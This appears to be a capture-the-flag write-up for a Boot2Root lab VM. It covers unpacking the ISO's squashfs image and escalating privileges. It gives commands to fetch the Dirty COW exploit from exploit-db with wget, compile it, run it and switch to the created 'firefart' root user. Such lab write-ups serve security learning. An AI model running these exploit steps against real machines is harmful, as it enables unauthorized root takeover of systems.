```
 ____              _   ___  _____             _   
 |  _ \            | | |__ \|  __ \           | |  
 | |_) | ___   ___ | |_   ) | |__) |___   ___ | |_ 
 |  _ < / _ \ / _ \| __| / /|  _  // _ \ / _ \| __|
 | |_) | (_) | (_) | |_ / /_| | \ \ (_) | (_) | |_ 
 |____/ \___/ \___/ \__|____|_|  \_\___/ \___/ \__|
```

## Unsquash

![Squash](https://s3.amazonaws.com/finecooking.s3.tauntonclud.com/app/uploads/2017/04/24170702/ING-butternut-squash-thumb1x1.jpg)

In order to better understand the file structure we can explore the ISO file by simply opening it.

There we find a .squashfs file corresponding to the compressed system.
It is possible to uncompress it in order to explore it:

```unsquashfs -f /Path/to/source/filesystem.squash.fs -d /Path/to/destination```


from there we can freely explore the system 

-----------------------------------------------------------------------------------------


## Privilege escalation

Now that we can connect as a low level user, we can attempt to use existing exploits that will grant us root access. These exploit are possible for certain versions of the kernel/OS/Architecture/distribution/Package_list running the server.

We can write download and execute external scripts in /tmp 

We used an [existing script](https://github.com/sneakymonk3y/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh) in order to recommend exploits from [www.exploit-db.com](https://www.exploit-db.com/) 

One exploit named dirtycow 2 fits perfectly to the VM's specs

- How
  - The In The Wild exploit relied on writing to /proc/self/mem on one side of the race.
  - ptrace(PTRACE_POKEDATA) can write to readonly mappings.
  - The attack relies on racing the madvise(MADV_DONTNEED) system call while having the page of the executable mmapped in memory.

Let's fetch it from within the ssh access ```wget --no-check-certificate https://www.exploit-db.com/download/40839 -O dirty.c```

Don't forget to chmod 755 and to compile with ```gcc -pthread dirty.c -o dirty -lcrypt```

Then just run it and provide a new password when prompted and ```su firefart```.

![Congrats](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/congrats.png)

***Congratulations! we just supplanted the root user*** 





  

